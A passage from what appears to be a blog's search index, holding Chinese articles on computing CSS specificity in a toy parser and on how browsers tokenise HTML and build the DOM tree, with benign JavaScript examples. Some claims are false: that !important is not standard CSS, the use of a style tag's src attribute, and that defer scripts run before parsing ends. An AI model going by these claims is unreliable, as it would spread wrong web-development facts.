class="hljs-keyword">if</span> (element.tagName === selector) &#123;        <span class="hljs-comment">// 标签选择器</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>如果匹配。下一步就是取 selectorParts 的倒数第二项：’div’，看是否和 img 标签的父元素匹配。就这样依次匹配 selectorParts 中的元素，直到结束。如果一直匹配，则表示选择器匹配了当前元素。选择器下的 CSS 规则就会添加到这个元素中。</p><h3 id="五、根据权重（Specificity）计算最终的-ComputedStyle"><a href="#五、根据权重（Specificity）计算最终的-ComputedStyle" class="headerlink" title="五、根据权重（Specificity）计算最终的 ComputedStyle"></a>五、根据权重（Specificity）计算最终的 ComputedStyle</h3><p>接下来就到了计算权重的时候了。在 HTML 标准中，对于样式权重，描述的比较模糊。标准是对于不同的选择器，使用不同数量级的数字来计算权重。在比较早的 IE 中是使用 10 倍或者更多倍数来计算权重。这样做的问题就是如果有足够数量的低权重选择器，就会覆盖高权重的选择器。</p><p>所以现代浏览器，会使用一个四位的数组来表示权重，第一位权重最高，逐渐递减。</p><p>一般数组的第一位表示行内样式，第二位表示 id 选择器，第三位表示 class 选择器，第四位表示  tagName 选择器。</p><p>这样在比较权重时是同级别与同级别比较，不会出现数量多而导致的权重覆盖问题。如果将来有新标准，调整数组的大小和位置就能满足要求。</p><p>下面我们来看一下代码如何实现：</p><pre><code class="hljs jsx"><span class="hljs-keyword">if</span> (matched) &#123;  <span class="hljs-keyword">const</span> sp = specificity(rule.selectors[<span class="hljs-number">0</span>]);  <span class="hljs-keyword">const</span> computedStyle = element.computedStyle;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> declaration <span class="hljs-keyword">of</span> rule.declarations) &#123;    <span class="hljs-keyword">if</span> (!computedStyle[declaration.property]) &#123;      computedStyle[declaration.property] = &#123;&#125;;    &#125;    <span class="hljs-keyword">if</span> (      !computedStyle[declaration.property].specificity ||      compara(computedStyle[declaration.property].specificity, sp) &lt; <span class="hljs-number">0</span>    ) &#123;      computedStyle[declaration.property].value = declaration.value;      computedStyle[declaration.property].specificity = sp;    &#125;  &#125;&#125;</code></pre><p>如果选择器匹配了当前规则那么，就要根据权重来计算 computedStyle。</p><p>我们来看一下 specificity 函数是如何实现的：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">specificity</span>(<span class="hljs-params">selector</span>) </span>&#123;  <span class="hljs-comment">// p[0]: inline-style</span>  <span class="hljs-comment">// p[1]: id</span>  <span class="hljs-comment">// p[2]: class</span>  <span class="hljs-comment">// p[3]: tagName</span>  <span class="hljs-keyword">let</span> p = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>];  <span class="hljs-keyword">const</span> selectorParts = selector.split(<span class="hljs-string">&#x27; &#x27;</span>);  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> part <span class="hljs-keyword">of</span> selectorParts) &#123;    <span class="hljs-keyword">if</span> (part.charAt(<span class="hljs-number">0</span>) === <span class="hljs-string">&#x27;#&#x27;</span>) &#123;      p[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span>;    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (part.charAt(<span class="hljs-number">0</span>) === <span class="hljs-string">&#x27;.&#x27;</span>) &#123;      p[<span class="hljs-number">2</span>] += <span class="hljs-number">1</span>;    &#125; <span class="hljs-keyword">else</span> &#123;      p[<span class="hljs-number">3</span>] += <span class="hljs-number">1</span>;    &#125;  &#125;  <span class="hljs-keyword">return</span> p;&#125;</code></pre><p>首先，新建一个长度为 4 的数组 p。里面的每一位存放的就是上面提到的四个不同权重选择器的值。每当匹配到一个选择器，这个选择器的值就加一。本文只是实现最基础的选择器，在真实的浏览器中还要处理更复杂的复合选择器等逻辑。不过处理的方式都是一样的。</p><p>下一步就是遍历 cssRules 里的每条规则了。如果在 computedStyle 中这条规则没有 specificity 属性，说明这条规则还没计算过权重，要把这个规则加上权重和值。</p><p>如果有 specificity 属性，那么就要和当前的选择器权重进行比较，compara 函数的实现如下：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">compara</span>(<span class="hljs-params">sp1, sp2</span>) </span>&#123;  <span class="hljs-keyword">if</span> (sp1[<span class="hljs-number">0</span>] - sp2[<span class="hljs-number">0</span>]) &#123;    <span class="hljs-keyword">return</span> sp1[<span class="hljs-number">0</span>] - sp2[<span class="hljs-number">0</span>];  &#125;  <span class="hljs-keyword">if</span> (sp1[<span class="hljs-number">1</span>] - sp2[<span class="hljs-number">1</span>]) &#123;    <span class="hljs-keyword">return</span> sp1[<span class="hljs-number">1</span>] - sp2[<span class="hljs-number">1</span>];  &#125;  <span class="hljs-keyword">if</span> (sp1[<span class="hljs-number">2</span>] - sp2[<span class="hljs-number">2</span>]) &#123;    <span class="hljs-keyword">return</span> sp1[<span class="hljs-number">2</span>] - sp2[<span class="hljs-number">2</span>];  &#125;  <span class="hljs-keyword">return</span> sp1[<span class="hljs-number">3</span>] - sp2[<span class="hljs-number">3</span>];&#125;</code></pre><p>逻辑很简单，就是逐位对比。用相同级别的选择器去做比较。比较出权重的大小后，按权重大小判断是否应该添加该规则。</p><h3 id="important"><a href="#important" class="headerlink" title="!important"></a>!important</h3><p>另外关于权重还有一个很常见的语法就是 !important。!important 会直接覆盖上述的那几类选择器。但是 !important 不是 CSS 标准。一般来说，在业务开发中，严禁使用 !important，除非是修复紧急线上 bug，在正常的业务开发中，使用 !important 会给调试带来巨大的麻烦。那么如何覆盖 !important 呢？!important 同样可以写多个，数量多的会覆盖数量少的。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过遍历每条 CSS 规则，然后计算权重，再比较权重，从而算出最终的 ComputedStyle。到此，浏览器是如何将 CSS 从一条条规则变成后面布局及渲染所需要的 ComputedStyle 规则的原理揭示出来了。本文是以实现一个 ToyCSSParser 的形式来展示浏览器解析 CSS 规则的原理，现实中浏览器要处理的规则和情况会复杂的多。但整体原理不变，不过复杂度大大增加。本文源码如下：</p><a href="https://github.com/huyinglin/ToyBrowser/blob/master/parser/cssParser.js" title="" target="">huyinglin&#x2F;ToyBrowser</a>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSS</tag>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DOM树的构建</title>
    <link href="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/"/>
    <url>/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>DOM 是 HTML 文档的编程接口。它提供了对文档的结构化的表述，并定义了一种方式可以使从程序中对该结构进行访问，从而改变文档的结构，样式和内容。那么浏览器是如何将 HTML 解析成 DOM 树的呢？我们今天来探索一下。</p><p>大体来说，从 HTML 文档到 DOM 树有两大步。第一步，将 HTML 文档解析成一个个 Token。第二步：根据 Token 构建 DOM 树。其具体的流程图如下：</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom.png" class=""><p>首先，浏览器从磁盘或网络读取 HTML 的原始字节，并根据文件的指定编码（例如 UTF-8）将它们转换成各个字符。下一步通过状态机去做分词，将字符串转换成 Token ，每个 Token 都具有特殊含义和一组规则。Token 会被转换成定义了属性等规则的“对象”，同时利用栈构建 DOM 树。下面，我们先来看看 Token 是这么被拆分的。</p><h2 id="Token-的拆分"><a href="#Token-的拆分" class="headerlink" title="Token 的拆分"></a>Token 的拆分</h2><p>Token 是编译原理里的一个术语，它表示最小的有意义的单元。 我们来看看一个非常标准的标签，会如何被拆分。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>text text text<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>这里第一个 Token 应该是什么呢？显然，作为一个词（Token），整个 p 标签肯定是过大了，甚至它里面还可以嵌套。那么，只用 p 标签的开头呢？也不太合适，因为标签里面可能有属性。这里的第一个 token 应该是 [&lt;p]，那么我们继续拆分，下一个 Token 就是 [class=”a”] 属性，然后是 p 标签的结束。接着是文本，最后是 p 标签的结束标签。我们把一段标签拆分成了几个 Token 。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom1.png" class=""><p>这里面的除了刚才拆分的几个 Token ，还有独立标签、文本节点、注释、CDATA数据节点等。</p><p>在chrome里，总共定义了7中 Token 类型：</p><pre><code class="hljs html">enum TokenType &#123;        StartTag,        EndTag,        Comment,    Character,    Uninitialized,    DOCTYPE,    EndOfFile,&#125;;</code></pre><p>根据这样的分析，浏览器是如何用代码实现的呢？。我们知道需要被解析器解析的代码是一点点的从浏览器网络进程接收来的，而且是接收一个字符，解析一个字符。</p><p>那么在接受第一个字符之前，我们完全无法判断这是哪一个 Token 。比如我们接收的第一个字符是 <code>&lt;</code> ，这个时候我们能判断它肯定不是一个属性的 Token ，那么它就有可能是开始标签的开始，结束标签、注释等等。那么随着我们接受的字符越来越多，拼出其他的内容可能性就越来越少。然后我们再继续读一个字符，比如是 <code>p</code>，那么我们知道它肯定不是一个注释了。然后我们就一直解析，当我们解析到了一个空格，这个时候已经匹配到了第一个 Token 了，它的意思就是一个标签的开始。</p><p>实际上，我们每读入一个字符都要做一次判断，而且这些判断都是跟当前状态有关的。如果我们想去实现将一个个字符解析成 Token，其实就是在这些 Token 的状态中不断的跳转，最后去匹配一个 Token，我们应该怎么做呢？常见的做法是使用状态机。</p><h2 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h2><p>绝大多数语言的词法部分都是用状态机实现的。我们来把刚才那些判断逻辑画成一个状态机来看看。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom2.png" class=""><p>当然了，这里的分析还比较粗糙，真正完成的 HTML 词法状态机，比这个要复杂的多。我们可以看看 HTML 官方文档。官方文档里定义了 80 个状态。</p><p><a href="https://html.spec.whatwg.org/multipage/parsing.html#tokenization">HTML</a></p><p>那么我来看看这里面具体的过程。开始从这个红点开始。在初始状态，我们仅仅区分 <code>&lt;</code> 和 <code>非&lt;</code>。如果这个字符是个<code>非&lt;</code>，那么可以认为进入了一个文本节点。如果这个字符是 <code>&lt;</code>，那么进入一个标签状态，就是 tag open 状态。到了 tag open 状态，后面可能有三种情况，它可能是个字母 [letter] ，或者是 <code>！</code>，或者是 <code>/</code>。然后再根据字符去判断下一步的状态。其本质就是将每个词的“特征字符”逐个拆分成独立的状态，然后再把所有词的特征字符合并起来，形成一个连通图。</p><p>有了状态机，我们来看看如何通过代码去实现这个状态机。我们可以先自己想一下，这个实现不太难，就是去做各种判断。我们来看一个用 JS 实现的例子。</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> data = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)</span>&#123;        <span class="hljs-keyword">if</span>(c === <span class="hljs-string">&quot;&lt;&quot;</span>) &#123;        <span class="hljs-keyword">return</span> tagOpen;    &#125;    <span class="hljs-keyword">if</span>(c === <span class="hljs-string">&quot;&amp;&quot;</span>) &#123;        <span class="hljs-keyword">return</span> characterReferenceInData;    &#125;    <span class="hljs-keyword">if</span>(c === <span class="hljs-string">&quot;\0&quot;</span>) &#123;        error();        emitToken(c);        <span class="hljs-keyword">return</span> data;    &#125;    <span class="hljs-keyword">if</span>(c === EOF) &#123;        emitToken(EOF);        <span class="hljs-keyword">return</span> data;    &#125;    emitToken(c);    <span class="hljs-keyword">return</span> data;&#125;;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tagOpen</span>(<span class="hljs-params">c</span>)</span>&#123;    <span class="hljs-keyword">if</span>(c === <span class="hljs-string">&quot;/&quot;</span>) &#123;        <span class="hljs-keyword">return</span> endTagOpenState;    &#125;    <span class="hljs-keyword">if</span>(c.match(<span class="hljs-regexp">/[A-Z]/</span>)) &#123;        token = <span class="hljs-keyword">new</span> StartTagToken();        token.name = c.toLowerCase();        <span class="hljs-keyword">return</span> tagNameState;    &#125;    <span class="hljs-keyword">if</span>(c.match(<span class="hljs-regexp">/[a-z]/</span>)) &#123;        token = <span class="hljs-keyword">new</span> StartTagToken();        token.name = c;        <span class="hljs-keyword">return</span> tagNameState;    &#125;    <span class="hljs-keyword">if</span>(c === <span class="hljs-string">&quot;?&quot;</span>) &#123;        <span class="hljs-keyword">return</span> bogusCommentState;    &#125;    error();    <span class="hljs-keyword">return</span> dataState;&#125;;<span class="hljs-comment">//……</span></code></pre><p>这里的 data 就是初始状态，比如这个字符是 <code>&lt; </code>，下一个字符就要用 tagOpen 函数去处理。如果这个那么已经可以匹配一个 Token了，那么可以用 emitToken 函数来输出解析好的 Token。这里每一个状态就是一个函数，通过函数里的判断来区分下一个字符需要被哪个函数判断，也就是状态的迁移，这个函数也会返回一个状态。这样我们的状态迁移代码就非常的简单：</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> state = data;<span class="hljs-keyword">let</span> char<span class="hljs-keyword">while</span>(char = getInput())    state = state(char);</code></pre><p>这里我们通过 while 循环去不断的处理传进来的字符流。那么我们来完善一下这个词法分析器：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HTMLLexicalParser</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-comment">//状态函数们……</span>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">data</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">// ……</span>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">tagOpen</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-comment">// ……</span>    &#125;    <span class="hljs-comment">// ……</span>    <span class="hljs-keyword">let</span> state = data;    <span class="hljs-built_in">this</span>.receiveInput = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">char</span>) </span>&#123;        state = state(char);    &#125;&#125;</code></pre><p>更完整的代码可以看这里：</p><p><a href="https://github.com/aimergenge/toy-html-parser">aimergenge/toy-html-parser</a></p><p>到了这个时候，我们就把字符流拆成 Token 了。</p><h2 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h2><p>下面就要把这些 Token 变成 DOM 树。我们还是结合一段代码来看具体的过程。</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>text text text<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>把这段代码拆成 Token 之后，就是这样子，我这里省略了里面的换行跟空格。</p><pre><code class="hljs jsx">tagName: html  |  type: startTag   |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: head  |  type: startTag   |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: meta  |  type: startTag   |  attr:charset=<span class="hljs-string">&quot;utf-8&quot;</span>  |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: head  |  type: EndTag     |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: body  |  type: startTag   |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: div   |  type: startTag   |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: p     |  type: startTag   |  attr:<span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;a&quot;</span>        |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName:       |  type: Character  |  attr:                 |  text: <span class="hljs-string">&#x27;text text text&#x27;</span>tagName: div   |  type: EndTag     |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: body  |  type: EndTag     |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName: html  |  type: EndTag     |  attr:                 |  text: <span class="hljs-string">&#x27;&#x27;</span>tagName:       |  type: EndOfFile  |  attr:                 |  tex*t: <span class="hljs-string">&#x27;&#x27;</span>*</code></pre><p>首先我们来看，这里的 Token 中，startTag 和 endTag 通常是需要成对匹配的。对于 <code>&lt;br/&gt;</code> 等情况会做特殊处理，这里不做讨论。</p><p>在解析开始的时候，会默认创建一个根为 document 的空 DOM 结构。同时会将一个 startTag document 的 Token 放入栈底。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom3.png" class=""><p>然后经过词法分析后的第一个 Token 会被持续的放入到栈中。同时会创建一个相应的 DOM 节点，用代码实现的话就是实例化一个元素。每生成一个 Token，就把它放入这个栈里面。当下一个 Token 是个 endTag 的时候，就会把栈里的 Token  一直弹出来，直到遇到一个和它的 tagName 一样的 Token 才停止。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom4.png" class=""><p>然后就通过这样不断的入栈出栈，最后生成整个的 DOM 树。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom5.png" class=""><p>这里讲的只是一个最简单的例子。现实情况中，还要处理图片、音频、视频。css、js等，还有容错机制。对于 HTML 文档，你从来没见过它报错。就算胡乱写，它也绝不会吭声。因为 HTML 的标准在演进的过程中走了很多岔路，浏览器需要兼容各种奇怪的写法，所以它有很多的容错机制。</p><p>到此，整个 DOM 树就构建完成了。</p><h2 id="哪些操作阻塞-DOM-树的解析？"><a href="#哪些操作阻塞-DOM-树的解析？" class="headerlink" title="哪些操作阻塞 DOM 树的解析？"></a>哪些操作阻塞 DOM 树的解析？</h2><p>最后我们再来看几个关于 DOM 树解析的几个常见的问题。</p><ol><li>JS会阻塞 DOM 树的解析吗？</li><li>CSS会阻塞 DOM 树的解析吗？</li></ol><p>我们先来看一段代码。</p><pre><code class="hljs jsx">&lt;html&gt;&lt;body&gt;    &lt;div&gt;text&lt;/div&gt;    &lt;script&gt;        <span class="hljs-keyword">let</span> div1 = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">&#x27;div&#x27;</span>)[<span class="hljs-number">0</span>];        div1.innerText = <span class="hljs-string">&#x27;insert text&#x27;</span>;    &lt;/script&gt;    &lt;div&gt;test&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>我在两个 DIV 中插入了一段内联的 JS 代码。这个时候会发生什么呢？此时解析器会停止 DOM 的解析。等待这段 JS 代码的执行，等它执行完了再继续解析下面的 DOM。因为这段代码可能会修改 DOM 的内容。必须执行完了这个修改才能继续下面的解析。</p><p>那么如果这个脚本是外链的呢？</p><pre><code class="hljs jsx"><span class="hljs-comment">//foo.js</span><span class="hljs-keyword">let</span> div1 = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">&#x27;div&#x27;</span>)[<span class="hljs-number">0</span>];div1.innerText = <span class="hljs-string">&#x27;insert text&#x27;</span>;</code></pre><pre><code class="hljs jsx">&lt;html&gt;&lt;body&gt;    &lt;div&gt;text&lt;/div&gt;    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&#x27;foo.js&#x27;</span>&gt;&lt;/script&gt;    &lt;div&gt;test&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这个时候，同样会停止 DOM 的解析，先下载这个 JS 文件，然后再执行这个文件。</p><p>我们再来看一种情况。</p><pre><code class="hljs jsx"><span class="hljs-comment">//theme.css</span>div &#123;    color:blue&#125;</code></pre><pre><code class="hljs jsx">&lt;html&gt;    &lt;head&gt;        &lt;style src=<span class="hljs-string">&#x27;theme.css&#x27;</span>&gt;&lt;/style&gt;    &lt;/head&gt;&lt;body&gt;    &lt;div&gt;text&lt;/div&gt;    &lt;script&gt;        <span class="hljs-keyword">let</span> div1 = <span class="hljs-built_in">document</span>.getElementsByTagName(<span class="hljs-string">&#x27;div&#x27;</span>)[<span class="hljs-number">0</span>];        div1.innerText = <span class="hljs-string">&#x27;insert text&#x27;</span>; <span class="hljs-comment">// 需要DOM</span>        div1.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;  <span class="hljs-comment">// 需要CSSOM</span>    &lt;/script&gt;    &lt;div&gt;test&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>这个代码里出现了一句 <code>div1.style.color = &#39;red&#39;</code>，它是去修改 DOM 元素的样式。这个时候，如果代码里引用了外部的 CSS 文件，那么在执行 JS 之前，要等待外部的 CSS 文件下载完成，并解析成 CSSOM 之后，才能执行 JS 代码。其实，不管 JS 代码里有没有去操作 style 的代码，都会先下载 CSS 文件，然后等待 CSS 解析完成后，再执行 JS 代码。</p><p>我们再来看看 script 标签两个常见的属性。async 和 defer。</p><pre><code class="hljs jsx">&lt;script <span class="hljs-keyword">async</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&#x27;foo.js&#x27;</span>&gt;&lt;/script&gt;&lt;script defer type=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&#x27;foo.js&#x27;</span>&gt;&lt;/script&gt;</code></pre><p>async 就是可以让这个 JS 代码异步执行。defer 是表明 JS 代码不会操作 DOM 的结构，它会先下载，在 DOM 树解析完之前去执行它。我们来看个图。</p><img src="/2020/08/14/DOM%E6%A0%91%E7%9A%84%E6%9E%84%E5%BB%BA/dom6.png" class=""><p>正常的 script 是同步的，遇到 script 就马上下载、执行。加了 defer 后，会先下载这个 JS 文件，然后在解析完 DOM 之前去执行它，加了 defer 后的表现和把 JS 文件放在 body 底部的效果一样。加了 async 后，它是异步下载 JS 文件，然后下载完就马上执行。</p><p>对于 script 标签，最稳妥的做法就是将其放到 body 底部。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>DOM</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
